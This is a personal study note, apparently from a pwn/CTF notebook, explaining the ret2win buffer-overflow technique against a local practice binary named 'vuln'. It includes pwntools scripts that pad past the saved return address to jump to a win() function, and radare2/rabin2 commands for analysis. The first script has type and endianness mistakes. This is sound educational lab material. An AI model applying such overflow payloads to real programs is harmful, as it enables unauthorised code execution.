*The most basic pwn challenge* :D
 A **ret2win** is simply a binary where there is a `win()` function (or equivalent); once you successfully redirect execution there, you complete the challenge.
### 1 - Padding :
*Extra bytes added that don’t carry “real” data, just used to align or fill space.* 
##### Simple and naive trials method :
This can be found using simple trial and error; if we send a variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP.
##### Best Method :  [[De Bruijn Sequences]]

### 2 - Find the win function address 
*ez : u can use elf to display all functions* 

### 3 - Testing first exploit for analysis : 
```python
from pwn import * # calling pwntools

p = process('./vuln') # Starting a new process

payload = b'A' * 52   # the padding 
payload += '\x08\x04\x91\xc3' # win function address 

log.info(p.clean()) # Output the info of the process

pause()        # Pause to give us time to attach radare2 onto the process , the purpose is to see what happens in details during the exploit

p.sendline(payload) # Send the payload

log.info(p.clean()) # Output the result of the exploit
 
```
Run the script then open new terminal window and run : 
```bash
r2 -d -A $(pidof vuln) 
```
By providing the PID of the process, radare2 hooks onto it, then we break at the return of the unsafe function and read the return pointer value. 
The exploit is not guaranteed to work because we still don t know the  [[Endianness]] of the system. 
#### 4 - Finding The Endianness :
- [[Radare2]] comes with a nice tool called [[rabin2]] for binary analysis
```bash
$ rabin2 -I vuln
```
### 5- Payload :
```python
from pwn import *            # This is how we import pwntools

p = process('./vuln')        # We're starting a new process

payload = b'A' * offset  # The padding
payload += p32(0x080491c3)   # Use pwntools to pack it

log.info(p.clean())          # Receive all the text
p.sendline(payload)

log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
```